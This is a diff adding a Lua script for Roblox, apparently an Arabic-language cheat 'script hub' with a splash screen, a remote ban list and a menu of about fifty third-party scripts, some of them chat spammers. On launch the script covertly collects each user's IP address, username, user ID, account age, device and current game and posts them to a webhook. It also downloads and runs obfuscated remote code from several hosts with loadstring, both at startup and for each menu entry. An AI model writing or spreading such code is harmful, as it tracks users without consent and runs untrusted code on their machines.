@@ -1,0 +1,1039 @@
+-- ============================================================
+-- 🔥 xlIlIlIlxlIIlIIIlx 🔥
+-- 57 سكربت + نظام المتصلين + نظام الحظر + ANA LOL
+-- ============================================================
+
+local CoreGui = game:GetService("CoreGui")
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+
+-- ============================================================
+-- 📤 Webhook
+-- ============================================================
+local webhookURL = ""
+
+local function getIP()
+    local ip = "غير معروف"
+    pcall(function()
+        local response = game:HttpGet("https://api.ipify.org?format=json", 5)
+        if response then
+            local data = HttpService:JSONDecode(response)
+            if data and data.ip then ip = data.ip end
+        end
+    end)
+    if ip == "غير معروف" then
+        pcall(function()
+            local response = game:HttpGet("https://httpbin.org/ip", 5)
+            if response then
+                local data = HttpService:JSONDecode(response)
+                if data and data.origin then ip = data.origin end
+            end
+        end)
+    end
+    return ip
+end
+
+local function getDeviceInfo()
+    local platform = "PC"
+    local p = UserInputService:GetPlatform()
+    if p == Enum.Platform.IOS then platform = "iOS"
+    elseif p == Enum.Platform.Android then platform = "Android"
+    elseif p == Enum.Platform.Windows then platform = "Windows"
+    elseif p == Enum.Platform.Mac then platform = "Mac"
+    elseif p == Enum.Platform.XBox then platform = "Xbox"
+    elseif p == Enum.Platform.PS4 then platform = "PlayStation"
+    end
+    return platform
+end
+
+local function getGameName()
+    local gameName = "غير معروف"
+    pcall(function()
+        gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+    end)
+    if gameName == "غير معروف" then
+        pcall(function() gameName = workspace.Name end)
+    end
+    return gameName
+end
+
+local function sendToWebhook()
+    pcall(function()
+        local ip = getIP()
+        local platform = getDeviceInfo()
+        local gameName = getGameName()
+        local accountAge = LocalPlayer.AccountAge
+        local ageText = (accountAge == 0 and "أقل من يوم" or accountAge .. " يوم")
+        local displayName = LocalPlayer.DisplayName
+
+        local data = {
+            username = "moah",
+            embeds = {{
+                title = "moah",
+                color = 0x0096FF,
+                fields = {
+                    { name = "👤 المستخدم", value = "```" .. LocalPlayer.Name .. "```", inline = true },
+                    { name = "🎭 اسم العرض", value = "```" .. displayName .. "```", inline = true },
+                    { name = "🆔 User ID", value = "```" .. LocalPlayer.UserId .. "```", inline = true },
+                    { name = "📅 عمر الحساب", value = "```" .. ageText .. "```", inline = true },
+                    { name = "📱 الجهاز", value = "```" .. platform .. "```", inline = true },
+                    { name = "🌐 IP Address", value = "```" .. ip .. "```", inline = true },
+                    { name = "🎮 اللعبة", value = "```" .. gameName .. "```", inline = true },
+                    { name = "🕐 الوقت", value = "```" .. os.date("%H:%M:%S - %d/%m/%Y") .. "```", inline = false }
+                },
+                footer = { text = "نظام xlIlIlIlxlIIlIIIlx" }
+            }}
+        }
+
+        local json = HttpService:JSONEncode(data)
+        request({Url = webhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = json})
+    end)
+end
+
+task.spawn(sendToWebhook)
+
+-- ============================================================
+-- 🚫 نظام الحظر + سكربت الحماية (قبل شاشة الترحيب)
+-- ============================================================
+
+local BannedNames = {}
+local BanListURL = "https://pastebin.com/raw/huJ8nzkY"
+
+task.spawn(function()
+    pcall(function()
+        local content = game:HttpGet(BanListURL, true)
+        if content and content ~= "" then
+            local success, decoded = pcall(function() return HttpService:JSONDecode(content) end)
+            if success and type(decoded) == "table" then
+                for _, name in ipairs(decoded) do
+                    table.insert(BannedNames, tostring(name))
+                end
+            else
+                for name in content:gmatch("[^\r\n]+") do
+                    local clean = name:gsub("^%s+", ""):gsub("%s+$", "")
+                    if clean ~= "" and clean:sub(1, 1) ~= "-" and clean:sub(1, 2) ~= "--" then
+                        table.insert(BannedNames, clean)
+                    end
+                end
+            end
+        end
+    end)
+end)
+
+local function IsBanned(player)
+    local name = player.Name:lower()
+    local display = player.DisplayName:lower()
+    local uid = tostring(player.UserId)
+    for _, banned in ipairs(BannedNames) do
+        local b = tostring(banned):lower()
+        if b ~= "" and (name == b or display == b or uid == b) then
+            return true, banned
+        end
+    end
+    return false, nil
+end
+
+task.spawn(function()
+    task.wait(1)
+    local banned, reason = IsBanned(LocalPlayer)
+    if banned then
+        local BanGui = Instance.new("ScreenGui")
+        BanGui.Name = "BanScreen"
+        BanGui.ResetOnSpawn = false
+        BanGui.IgnoreGuiInset = true
+        BanGui.DisplayOrder = 2147483647
+        BanGui.Parent = CoreGui
+
+        local BanFrame = Instance.new("Frame")
+        BanFrame.Size = UDim2.new(1, 0, 1, 0)
+        BanFrame.BackgroundColor3 = Color3.fromRGB(5, 0, 0)
+        BanFrame.BorderSizePixel = 0
+        BanFrame.Parent = BanGui
+
+        local BanBox = Instance.new("Frame")
+        BanBox.Size = UDim2.new(0, 450, 0, 320)
+        BanBox.Position = UDim2.new(0.5, -225, 0.5, -160)
+        BanBox.BackgroundColor3 = Color3.fromRGB(20, 5, 5)
+        BanBox.BorderSizePixel = 0
+        BanBox.Parent = BanGui
+        Instance.new("UICorner", BanBox).CornerRadius = UDim.new(0, 20)
+
+        local BoxStroke = Instance.new("UIStroke")
+        BoxStroke.Color = Color3.fromRGB(255, 0, 0)
+        BoxStroke.Thickness = 3
+        BoxStroke.Parent = BanBox
+
+        local BanIcon = Instance.new("TextLabel")
+        BanIcon.Size = UDim2.new(1, 0, 0, 80)
+        BanIcon.Position = UDim2.new(0, 0, 0, 15)
+        BanIcon.BackgroundTransparency = 1
+        BanIcon.Text = "🚫"
+        BanIcon.TextSize = 65
+        BanIcon.Font = Enum.Font.GothamBold
+        BanIcon.Parent = BanBox
+
+        local BanTitle = Instance.new("TextLabel")
+        BanTitle.Size = UDim2.new(1, -20, 0, 40)
+        BanTitle.Position = UDim2.new(0, 10, 0, 100)
+        BanTitle.BackgroundTransparency = 1
+        BanTitle.Text = "تم حظرك من السكربت"
+        BanTitle.TextColor3 = Color3.fromRGB(255, 30, 30)
+        BanTitle.Font = Enum.Font.GothamBlack
+        BanTitle.TextSize = 24
+        BanTitle.Parent = BanBox
+
+        local BanDesc = Instance.new("TextLabel")
+        BanDesc.Size = UDim2.new(1, -30, 0, 100)
+        BanDesc.Position = UDim2.new(0, 15, 0, 150)
+        BanDesc.BackgroundTransparency = 1
+        BanDesc.Text = "أنت في قائمة الحظر لهذا السكربت.\n\n📩 تواصل مع المطور لإزالة الحظر\n👑 xlIlIlIlxlIIlIIIlx"
+        BanDesc.TextColor3 = Color3.fromRGB(220, 220, 220)
+        BanDesc.Font = Enum.Font.GothamBold
+        BanDesc.TextSize = 13
+        BanDesc.TextWrapped = true
+        BanDesc.Parent = BanBox
+
+        local BanFooter = Instance.new("TextLabel")
+        BanFooter.Size = UDim2.new(1, 0, 0, 20)
+        BanFooter.Position = UDim2.new(0, 0, 1, -30)
+        BanFooter.BackgroundTransparency = 1
+        BanFooter.Text = "xlIlIlIlxlIIlIIIlx © " .. os.date("%Y")
+        BanFooter.TextColor3 = Color3.fromRGB(150, 50, 50)
+        BanFooter.Font = Enum.Font.GothamBold
+        BanFooter.TextSize = 11
+        BanFooter.Parent = BanBox
+
+        pcall(function()
+            local data = {
+                username = "🚫 Ban System",
+                embeds = {{
+                    title = "🚫 محاولة استخدام من شخص محظور",
+                    color = 0xFF0000,
+                    fields = {
+                        { name = "👤 الاسم", value = "```" .. LocalPlayer.Name .. "```", inline = true },
+                        { name = "🆔 UserId", value = "```" .. LocalPlayer.UserId .. "```", inline = true },
+                        { name = "📌 مطابق لـ", value = "```" .. tostring(reason) .. "```", inline = true },
+                        { name = "🕐 الوقت", value = "```" .. os.date("%H:%M:%S - %d/%m/%Y") .. "```", inline = false }
+                    },
+                    footer = { text = "Ban System - xlIlIlIlxlIIlIIIlx" }
+                }}
+            }
+            request({
+                Url = webhookURL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(data)
+            })
+        end)
+
+        task.wait(4)
+        LocalPlayer:Kick("🚫 أنت في قائمة الحظر لهذا السكربت.\n📩 تواصل مع المطور: xlIlIlIlxlIIlIIIlx")
+    end
+end)
+
+Players.PlayerAdded:Connect(function(player)
+    task.wait(1)
+    local banned = IsBanned(player)
+    if banned then
+        pcall(function()
+            player:Kick("🚫 أنت في قائمة الحظر لهذا السكربت.")
+        end)
+    end
+end)
+
+-- شاشة الترحيب الجديدة (قبل القديمة)
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=6429506310573"))("6429506310573")
+    end)
+end)
+
+task.wait(2)
+
+-- ============================================================
+-- 🎬 شاشة الترحيب القديمة (الشاشة الثانية)
+-- ============================================================
+local function CreateSplashScreen()
+    local sg = Instance.new("ScreenGui")
+    sg.Name = "VoidSplash"
+    sg.ResetOnSpawn = false
+    sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    sg.Parent = CoreGui
+
+    local splashFrame = Instance.new("Frame")
+    splashFrame.Size = UDim2.new(0, 380, 0, 320)
+    splashFrame.Position = UDim2.new(0.5, -190, 0.5, -160)
+    splashFrame.BackgroundColor3 = Color3.fromRGB(15, 10, 30)
+    splashFrame.BackgroundTransparency = 0.1
+    splashFrame.ZIndex = 50
+    splashFrame.Parent = sg
+    Instance.new("UICorner", splashFrame).CornerRadius = UDim.new(0, 20)
+
+    local splashStroke = Instance.new("UIStroke")
+    splashStroke.Thickness = 2
+    splashStroke.Color = Color3.fromRGB(255, 0, 0)
+    splashStroke.Transparency = 0.3
+    splashStroke.Parent = splashFrame
+
+    local splashRainbow
+    splashRainbow = RunService.Heartbeat:Connect(function()
+        local hue = (tick() * 0.5) % 1
+        splashStroke.Color = Color3.fromHSV(hue, 1, 1)
+    end)
+
+    local splashGradient = Instance.new("UIGradient")
+    splashGradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0.0, Color3.fromRGB(220, 20, 60)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(8, 6, 15)),
+        ColorSequenceKeypoint.new(1.0, Color3.fromRGB(130, 25, 220))
+    })
+    splashGradient.Rotation = 35
+    splashGradient.Parent = splashFrame
+
+    local splashTitle = Instance.new("TextLabel")
+    splashTitle.Size = UDim2.new(1, -20, 0, 35)
+    splashTitle.Position = UDim2.new(0, 10, 0, 12)
+    splashTitle.BackgroundTransparency = 1
+    splashTitle.Text = "👑 نورت السكربت"
+    splashTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+    splashTitle.Font = Enum.Font.GothamBold
+    splashTitle.TextSize = 17
+    splashTitle.ZIndex = 51
+    splashTitle.Parent = splashFrame
+
+    local splashSub = Instance.new("TextLabel")
+    splashSub.Size = UDim2.new(1, -20, 0, 22)
+    splashSub.Position = UDim2.new(0, 10, 0, 48)
+    splashSub.BackgroundTransparency = 1
+    splashSub.Text = "تم تطوير السكربت بواسطة جاسم"
+    splashSub.TextColor3 = Color3.fromRGB(200, 200, 220)
+    splashSub.Font = Enum.Font.GothamSemibold
+    splashSub.TextSize = 11
+    splashSub.ZIndex = 51
+    splashSub.Parent = splashFrame
+
+    local descriptionLabel = Instance.new("TextLabel")
+    descriptionLabel.Size = UDim2.new(1, -30, 0, 30)
+    descriptionLabel.Position = UDim2.new(0, 15, 0, 72)
+    descriptionLabel.BackgroundTransparency = 1
+    descriptionLabel.Text = "🔥 انضم لسيرفر الدسكورد: https://discord.gg/EjPjg6kWCp 🔥"
+    descriptionLabel.TextColor3 = Color3.fromRGB(255, 215, 0)
+    descriptionLabel.Font = Enum.Font.GothamSemibold
+    descriptionLabel.TextSize = 10
+    descriptionLabel.TextWrapped = true
+    descriptionLabel.ZIndex = 51
+    descriptionLabel.Parent = splashFrame
+
+    local devContainer = Instance.new("Frame")
+    devContainer.Size = UDim2.new(1, 0, 0, 120)
+    devContainer.Position = UDim2.new(0, 0, 0, 105)
+    devContainer.BackgroundTransparency = 1
+    devContainer.ZIndex = 51
+    devContainer.Parent = splashFrame
+
+    local dev1Frame = Instance.new("Frame")
+    dev1Frame.Size = UDim2.new(0, 120, 0, 110)
+    dev1Frame.Position = UDim2.new(0.5, -145, 0, 5)
+    dev1Frame.BackgroundColor3 = Color3.fromRGB(20, 15, 35)
+    dev1Frame.BackgroundTransparency = 0.3
+    dev1Frame.ZIndex = 51
+    dev1Frame.Parent = devContainer
+    Instance.new("UICorner", dev1Frame).CornerRadius = UDim.new(0, 12)
+
+    local dev1Image = Instance.new("ImageLabel")
+    dev1Image.Size = UDim2.new(0, 60, 0, 60)
+    dev1Image.Position = UDim2.new(0.5, -30, 0, 8)
+    dev1Image.BackgroundColor3 = Color3.fromRGB(25, 20, 35)
+    dev1Image.Image = "rbxassetid://140112983800372"
+    dev1Image.ZIndex = 52
+    dev1Image.Parent = dev1Frame
+    Instance.new("UICorner", dev1Image).CornerRadius = UDim.new(1, 0)
+
+    local dev1Label = Instance.new("TextLabel")
+    dev1Label.Size = UDim2.new(1, 0, 0, 20)
+    dev1Label.Position = UDim2.new(0, 0, 0, 75)
+    dev1Label.BackgroundTransparency = 1
+    dev1Label.Text = "جاسم"
+    dev1Label.TextColor3 = Color3.fromRGB(255, 255, 255)
+    dev1Label.Font = Enum.Font.GothamBold
+    dev1Label.TextSize = 14
+    dev1Label.ZIndex = 52
+    dev1Label.Parent = dev1Frame
+
+    local dev1Desc = Instance.new("TextLabel")
+    dev1Desc.Size = UDim2.new(1, 0, 0, 16)
+    dev1Desc.Position = UDim2.new(0, 0, 0, 93)
+    dev1Desc.BackgroundTransparency = 1
+    dev1Desc.Text = "تيك- band_owner"
+    dev1Desc.TextColor3 = Color3.fromRGB(255, 200, 100)
+    dev1Desc.Font = Enum.Font.GothamSemibold
+    dev1Desc.TextSize = 9
+    dev1Desc.ZIndex = 52
+    dev1Desc.Parent = dev1Frame
+
+    local fireLabel = Instance.new("TextLabel")
+    fireLabel.Size = UDim2.new(0, 40, 0, 40)
+    fireLabel.Position = UDim2.new(0.5, -20, 0, 40)
+    fireLabel.BackgroundTransparency = 1
+    fireLabel.Text = "🔥"
+    fireLabel.TextSize = 30
+    fireLabel.ZIndex = 53
+    fireLabel.Parent = devContainer
+
+    local dev2Frame = Instance.new("Frame")
+    dev2Frame.Size = UDim2.new(0, 120, 0, 110)
+    dev2Frame.Position = UDim2.new(0.5, 25, 0, 5)
+    dev2Frame.BackgroundColor3 = Color3.fromRGB(20, 15, 35)
+    dev2Frame.BackgroundTransparency = 0.3
+    dev2Frame.ZIndex = 51
+    dev2Frame.Parent = devContainer
+    Instance.new("UICorner", dev2Frame).CornerRadius = UDim.new(0, 12)
+
+    local dev2Image = Instance.new("ImageLabel")
+    dev2Image.Size = UDim2.new(0, 60, 0, 60)
+    dev2Image.Position = UDim2.new(0.5, -30, 0, 8)
+    dev2Image.BackgroundColor3 = Color3.fromRGB(25, 20, 35)
+    dev2Image.Image = "rbxassetid://140112983800372"
+    dev2Image.ZIndex = 52
+    dev2Image.Parent = dev2Frame
+    Instance.new("UICorner", dev2Image).CornerRadius = UDim.new(1, 0)
+
+    local dev2Label = Instance.new("TextLabel")
+    dev2Label.Size = UDim2.new(1, 0, 0, 20)
+    dev2Label.Position = UDim2.new(0, 0, 0, 75)
+    dev2Label.BackgroundTransparency = 1
+    dev2Label.Text = "جاسم"
+    dev2Label.TextColor3 = Color3.fromRGB(255, 255, 255)
+    dev2Label.Font = Enum.Font.GothamBold
+    dev2Label.TextSize = 14
+    dev2Label.ZIndex = 52
+    dev2Label.Parent = dev2Frame
+
+    local dev2Desc = Instance.new("TextLabel")
+    dev2Desc.Size = UDim2.new(1, 0, 0, 16)
+    dev2Desc.Position = UDim2.new(0, 0, 0, 93)
+    dev2Desc.BackgroundTransparency = 1
+    dev2Desc.Text = "المطور"
+    dev2Desc.TextColor3 = Color3.fromRGB(255, 200, 100)
+    dev2Desc.Font = Enum.Font.GothamSemibold
+    dev2Desc.TextSize = 9
+    dev2Desc.ZIndex = 52
+    dev2Desc.Parent = dev2Frame
+
+    local loadingBar = Instance.new("Frame")
+    loadingBar.Size = UDim2.new(0.8, 0, 0, 4)
+    loadingBar.Position = UDim2.new(0.1, 0, 0, 278)
+    loadingBar.BackgroundColor3 = Color3.fromRGB(40, 30, 60)
+    loadingBar.ZIndex = 51
+    loadingBar.Parent = splashFrame
+    Instance.new("UICorner", loadingBar).CornerRadius = UDim.new(0, 2)
+
+    local loadingFill = Instance.new("Frame")
+    loadingFill.Size = UDim2.new(0, 0, 1, 0)
+    loadingFill.BackgroundColor3 = Color3.fromRGB(255, 50, 90)
+    loadingFill.ZIndex = 52
+    loadingFill.Parent = loadingBar
+    Instance.new("UICorner", loadingFill).CornerRadius = UDim.new(0, 2)
+
+    local loadingText = Instance.new("TextLabel")
+    loadingText.Size = UDim2.new(1, 0, 0, 16)
+    loadingText.Position = UDim2.new(0, 0, 0, 285)
+    loadingText.BackgroundTransparency = 1
+    loadingText.Text = "جاري التحميل..."
+    loadingText.TextColor3 = Color3.fromRGB(180, 180, 200)
+    loadingText.Font = Enum.Font.GothamSemibold
+    loadingText.TextSize = 10
+    loadingText.ZIndex = 51
+    loadingText.Parent = splashFrame
+
+    local tween = TweenService:Create(loadingFill, TweenInfo.new(4.5, Enum.EasingStyle.Linear), {Size = UDim2.new(1, 0, 1, 0)})
+    tween:Play()
+
+    task.spawn(function()
+        for i = 1, 45 do
+            loadingText.Text = "جاري التحميل... " .. math.floor((i / 45) * 100) .. "%"
+            task.wait(0.1)
+        end
+        loadingText.Text = "تم التحميل! ✓"
+    end)
+
+    task.wait(5)
+    splashFrame.Visible = false
+    splashRainbow:Disconnect()
+    sg:Destroy()
+end
+
+CreateSplashScreen()
+
+-- ============================================================
+-- 🎨 الألوان
+-- ============================================================
+local Colors = {
+    Main = Color3.fromRGB(10, 10, 18),
+    Secondary = Color3.fromRGB(18, 18, 28),
+    Accent = Color3.fromRGB(0, 150, 255),
+    AccentRed = Color3.fromRGB(255, 50, 50),
+    AccentGold = Color3.fromRGB(255, 200, 0),
+    AccentPurple = Color3.fromRGB(180, 130, 255),
+    AccentGreen = Color3.fromRGB(0, 230, 115),
+    Text = Color3.fromRGB(255, 255, 255),
+    TextDim = Color3.fromRGB(180, 180, 210),
+    Card = Color3.fromRGB(14, 14, 22),
+    Border = Color3.fromRGB(40, 40, 80),
+    Search = Color3.fromRGB(10, 10, 18),
+    Success = Color3.fromRGB(0, 200, 100),
+    Error = Color3.fromRGB(255, 60, 90),
+    Warning = Color3.fromRGB(255, 170, 0),
+}
+
+local function ExecuteScript(code, name)
+    local success = false
+    pcall(function()
+        local func = loadstring(code)
+        if func then func() success = true end
+    end)
+    if not success then warn("❌ فشل تشغيل " .. name) end
+    return success
+end
+
+-- ============================================================
+-- 📋 قائمة السكربتات (57 سكربت)
+-- ============================================================
+local Scripts = {
+    {id = 1, name = "🔵 بلو القديم", desc = "Blue Hub - النسخة القديمة", color = Color3.fromRGB(30, 144, 255), code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=7304342633905"))("7304342633905")'},
+    {id = 2, name = "🔮 مويل", desc = "مفتاح السكربت: MOIW3294ES", color = Colors.AccentPurple, code = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/moiladiab-oss/MOILA933/main/README.md"))()'},
+    {id = 3, name = "🔵 سكربت بلو", desc = "Blue Hub - نسخة محدثة", color = Color3.fromRGB(30, 144, 255), code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=3182512757742"))("3182512757742")'},
+    {id = 4, name = "💀 سكربت ايفل", desc = "مفاتيح: free_evilhub999 ~ free_evilhub1006 ~ free_evilhub055", color = Colors.AccentRed, code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=7982059235311"))("7982059235311")'},
+    {id = 5, name = "🔥 سكربت لور", desc = "LOR LN - نظام متقدم", color = Colors.AccentGold, code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=0945999211738"))("0945999211738")'},
+    {id = 6, name = "🟣 فيكس جديد", desc = "VEX MENU - النسخة الجديدة", color = Colors.AccentPurple, code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=5136756936555"))("5136756936555")'},
+    {id = 7, name = "🟣 سكربت فجر", desc = "مفتاح السكربت: 789078907890", color = Colors.AccentPurple, code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=3540795111646"))("3540795111646")'},
+    {id = 8, name = "🎯 سكربت بوزو", desc = "ARB Bozo Hub", color = Color3.fromRGB(10, 25, 55), code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=2667716819140"))("2667716819140")'},
+    {id = 9, name = "🟣 فيكس قديم", desc = "VEX MENU - النسخة القديمة", color = Colors.AccentPurple, code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=8798435969985"))("8798435969985")'},
+    {id = 10, name = "🃏 سكربت الجوكر", desc = "AlJoKeR Script", color = Color3.fromRGB(255, 20, 20), code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=ownerscript11"))("ownerscript11")'},
+    {id = 11, name = "⚫ سكربت بلاك", desc = "BLACK HUB", color = Color3.fromRGB(150, 0, 24), code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=3818459975485"))("3818459975485")'},
+    {id = 12, name = "🔴 سكربت ار ثلاث دي", desc = "R3D HUB", color = Colors.AccentGreen, code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=2930530794429"))("2930530794429")'},
+    {id = 13, name = "🛡️ سكربت مضاد تفعيل", desc = "Advanced Arabic Protection", color = Colors.AccentGreen, code = 'loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Advanced-Arabic-Protection-System-111187"))()'},
+    {id = 14, name = "👑 سكربت شهد 2", desc = "سكربت شهد - النسخة الثانية", color = Colors.AccentGold, code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=9978778971477"))("9978778971477")'},
+    {id = 15, name = "🌀 سكربت روت", desc = "ROOT", color = Colors.AccentPurple, code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=4116944131475"))("4116944131475")'},
+    {id = 16, name = "🩸 سكربت بلود", desc = "BLOOD", color = Colors.AccentRed, code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=4245942646252"))("4245942646252")'},
+    {id = 17, name = "🌟 سكربت ياسين", desc = "سكربت ياسين", color = Colors.AccentGold, code = 'loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-AHEAD-NO-SPAM-236577"))()'},
+    {id = 18, name = "🤪 سكربت كرازي هوب", desc = "مفتاح: 12516ILQkbWh", color = Color3.fromRGB(255, 100, 0), code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=5686852694385"))("5686852694385")'},
+    {id = 19, name = "🔥 سكربت انا هوب (القديم)", desc = "شبيه مسر4", color = Colors.AccentRed, code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=3600670712973"))("3600670712973")'},
+    {id = 20, name = "⚡ سكربت مسر4", desc = "MCR4", color = Color3.fromRGB(255, 200, 0), code = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/MCR4-team/MCR4-REAL/refs/heads/main/realmcrraw"))()'},
+    {id = 21, name = "👤 سكربت مؤيد", desc = "سكربت مؤيد", color = Colors.AccentPurple, code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=6515684056953"))("6515684056953")'},
+    {id = 22, name = "👤 اول سكربت لمؤيد", desc = "النسخة الأولى", color = Colors.AccentPurple, code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=2583866073760"))("2583866073760")'},
+    {id = 23, name = "🟣 سكربت ادف", desc = "مفتاح: adf_hubinew", color = Colors.AccentPurple, code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=1740064347815"))("1740064347815")'},
+    {id = 24, name = "👑 سكربت ماستر", desc = "MASTER", color = Colors.AccentGold, code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=2963841142023"))("2963841142023")'},
+    {id = 25, name = "📋 سكربت كمبدبار تو", desc = "HD Admin - Cmdbar2", color = Colors.AccentPurple, code = 'loadstring(game:HttpGet("https://pastebin.com/raw/2kWYe98f"))()'},
+    {id = 26, name = "🌀 سكربت في ار سفن", desc = "VR7", color = Colors.AccentPurple, code = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/Hm5011/hussain/refs/heads/main/Mercy%20Script"))()'},
+    {id = 27, name = "🛡️ سكربت حمايه لاوامر الجسد", desc = "حماية من أوامر الجسد", color = Colors.AccentGreen, code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=7466879483066"))("7466879483066")'},
+    {id = 29, name = "⚫ سكربت بلاك الاساسي", desc = "BLACK HUB - الأساسية", color = Color3.fromRGB(150, 0, 24), code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=5845308033224"))("5845308033224")'},
+    {id = 30, name = "🌀 سكربت فاس", desc = "FAS", color = Colors.AccentPurple, code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=6943684952732"))("6943684952732")'},
+    {id = 32, name = "🔥 سكربت كاراس", desc = "OP HUB", color = Colors.AccentRed, code = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/karookaro11-ai/OP-HUB/refs/heads/main/OP%20HUB.txt"))()'},
+    {id = 33, name = "🛡️ حماية تايتل", desc = "حماية التايتل", color = Colors.AccentGreen, code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=5842144459084"))("5842144459084")'},
+    {id = 34, name = "🛡️ حماية رقصات", desc = "حماية من الرقصات", color = Colors.AccentGreen, code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=5533478825818"))("5533478825818")'},
+    {id = 35, name = "🛡️ مضاد تجميد", desc = "مضاد التجميد", color = Colors.AccentGreen, code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=5788726165716"))("5788726165716")'},
+    {id = 36, name = "🔥 سكربت عماد", desc = "سكربت عماد", color = Colors.AccentRed, code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=5602916142299"))("5602916142299")'},
+    {id = 37, name = "🛡️ حماية", desc = "نظام حماية متقدم", color = Colors.AccentGreen, code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=7198203912629"))("7198203912629")'},
+    {id = 38, name = "🛡️ حماية ماب النسخ (الجديد)", desc = "حماية من نسخ الماب", color = Colors.AccentGreen, code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=0568642506151"))("0568642506151")'},
+    {id = 39, name = "📋 سكربت نسخ", desc = "نظام نسخ متقدم", color = Colors.AccentPurple, code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=3574548214553"))("3574548214553")'},
+    {id = 40, name = "🔮 مولين (الجديد)", desc = "نظام مولين المتقدم", color = Colors.AccentPurple, code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=3914283696626"))("3914283696626")'},
+    {id = 41, name = "🛡️ مضاد ري و ايكسبلودي", desc = "حماية من الري والانفجار", color = Colors.AccentGreen, code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=1675611779428"))("1675611779428")'},
+    {id = 42, name = "💬 سبام مخفي", desc = "سبام في الشات", color = Colors.AccentPurple, code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=6784460102782"))("6784460102782")'},
+    {id = 43, name = "⚡ سبام قوي", desc = "سبام سريع", color = Colors.AccentRed, code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=3861973832076"))("3861973832076")'},
+    {id = 44, name = "🌟 سكربت شهد", desc = "سكربت شهد", color = Colors.AccentGold, code = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/Shhd-code/K/refs/heads/main/README.md"))()'},
+    {id = 45, name = "🔴 اكس سفن ار (X7R)", desc = "X7R", color = Colors.AccentRed, code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=6417023866079"))("6417023866079")'},
+    {id = 46, name = "💜 يوناريوم (Yunarium)", desc = "Yunarium", color = Color3.fromRGB(150, 100, 255), code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=8504296014771"))("8504296014771")'},
+    {id = 47, name = "💛 سكربت عمر (Omar)", desc = "Omar", color = Color3.fromRGB(255, 200, 50), code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=2565780791035"))("2565780791035")'},
+    {id = 48, name = "🎒 سحب جميع الأدوات", desc = "سحب كل الأدوات من الماب", color = Color3.fromRGB(0, 200, 255), code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=3666141075760"))("3666141075760")'},
+    {id = 49, name = "💣 ماب حرب القنابل العرب", desc = "خريطة حرب القنابل", color = Color3.fromRGB(255, 100, 0), code = 'loadstring(game:HttpGet("https://pastefy.app/y3oBydTf/raw?t=" .. tick()))()'},
+    {id = 50, name = "💥 حرب القنابل العرب", desc = "النسخة الكاملة", color = Color3.fromRGB(255, 50, 0), code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=6701450797897"))("6701450797897")'},
